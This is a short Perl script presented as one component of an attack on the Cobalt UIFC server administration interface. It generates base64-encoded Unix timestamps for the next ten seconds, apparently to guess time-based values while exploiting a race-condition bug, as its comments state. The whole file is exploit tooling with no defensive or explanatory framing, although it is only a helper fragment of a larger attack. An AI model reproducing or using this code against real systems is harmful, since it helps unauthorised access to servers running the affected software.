#!/usr/bin/perl
# mass base64 time encoder
# part of Cobalt UIFC XTR remote/local combination attack


use MIME::Base64;
$evil_time = time();

$exploit_secs = 10; # time in seconds you got to exploit this bug (race)

for($i=1;$i<=$exploit_secs; $i++) {
      $evil_time = $evil_time+1;
      $evilstr = encode_base64($evil_time);
      print $evilstr;
}
